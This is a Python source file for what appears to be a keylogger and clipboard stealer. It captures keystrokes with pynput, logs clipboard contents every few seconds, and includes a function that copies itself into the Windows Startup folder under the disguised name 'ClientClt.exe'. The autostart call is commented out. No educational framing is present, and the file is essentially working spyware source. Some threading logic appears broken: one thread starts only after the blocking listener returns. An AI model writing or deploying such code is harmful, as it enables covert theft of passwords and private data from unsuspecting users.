from pynput import keyboard
import time, threading, pyperclip, shutil, os
from pathlib import Path

kelogger_data = []
clipboard_data = ['']
current_data_pos = 0
has_been_pressed = False
keylogger_wait_time = 3
clipboard_wait_time = 3
startup_file_name = "ClientClt.exe"


def on_press(key):
    global has_been_pressed, kelogger_data
    try:
        if key.vk in range(96, 106):
            # numpad numbers 0-9
            formated = str(int(key.vk) - 96)
        else:
            # normal characters
            formated = key.char
    except AttributeError:
        # special keys
        if key == keyboard.Key.space:
            # space
            formated = " "
        elif key == keyboard.Key.backspace:
            # backspace
            formated = "^BSpace^"
        else:
            # others
            return

    if len(kelogger_data) > current_data_pos:
        kelogger_data[current_data_pos] += formated
    else:
        kelogger_data.append(formated)

    has_been_pressed = True
    # print(kelogger_data)


def change_current():
    global current_data_pos, has_been_pressed, kelogger_data
    if has_been_pressed == False and len(kelogger_data) > current_data_pos:
        current_data_pos += 1
    has_been_pressed = False
    time.sleep(keylogger_wait_time)
    change_current()


def copy_clipboard():
    return pyperclip.paste()


def clipboard_checker():
    global clipboard_data
    if copy_clipboard() != clipboard_data[-1]:
        clipboard_data.append(copy_clipboard())
    time.sleep(clipboard_wait_time)
    clipboard_checker()


def create_schedule_task():
    path = Path(__file__)

    startup_path = (Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup")
    final_path = startup_path / startup_file_name

    if not final_path.is_file():
        shutil.copy(path, final_path)


# add exe to autostart
# threading.Thread(target=create_schedule_task, daemon=True).start()

# clipboard start
threading.Thread(target=clipboard_checker, daemon=True).start()

# keylogger start
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
threading.Thread(target=change_current, daemon=True).start()
